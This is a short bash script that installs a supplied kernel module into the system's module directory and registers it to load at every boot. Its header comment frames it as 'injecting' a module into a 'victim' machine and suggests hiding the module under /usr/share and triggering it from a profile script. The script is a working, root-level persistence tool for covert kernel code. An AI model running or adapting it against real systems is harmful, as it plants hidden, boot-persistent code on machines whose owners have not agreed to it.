#!/usr/bin/bash
#
#  Shell script that will inject module into the system (or at least die trying to)
#		location of the module will be in expected places, how this module was 
#       primary mend to test log reading capacities. Module can be loaded in and hidden in 
#       different ways, a good usage case would be to hide module into /usr/share path and 
#       insert the same using for eg. profile script. Be creative and don't forget usage of this
#       module can be pain in the neck for the victim, so don't be to harsh on them.
#
#
#
#  Usage:
#      bash inject_ksm.sh module.ko.path 
#
#
#   Author:  Hrvoje Novosel<hrvojedotnovosel@gmail.com>
#   Created: 1. July 2017
#
#

if [ "$#" -ne 1 ] || [ ! -f "$1" ]; then
	echo "Usage:"
	echo "./inject_ksm.sh module.ko.path"
	exit 1
fi

if [ "$EUID" -ne 0 ]; then
	echo "Script must be executed under privileged user"
	exit 1
fi

MODULE_NAME=$(basename -s .ko  $1)
MODULES_PATH=/usr/lib/modules/$(uname -r)/

# copy module to safe location?
if [ -d $MODULES_PATH"extra" ]; then
	MODULES_PATH=$MODULES_PATH"extra"
elif [ -d $MODULES_PATH"kernel" ]; then
	if [[ ! -d $MODULES_PATH"kernel/misc" ]]; then
		mkdir $MODULES_PATH"kernel/misc"
	fi
	MODULES_PATH=$MODULES_PATH"kernel/misc"
else
	echo "Cannot find modules path, giving up ..."
	exit 1
fi

echo "Installing module"
cp $1 $MODULES_PATH"/"

echo "Inserting module on boot time"
if  [[ -d "/usr/lib/modules-load.d" ]]; then
	echo $MODULE_NAME > "/usr/lib/modules-load.d/"$MODULE_NAME".conf"
	sleep 1
	depmod -a
	modinfo $MODULE_NAME
	modprobe $MODULE_NAME
	# TODO: add options for the module
fi

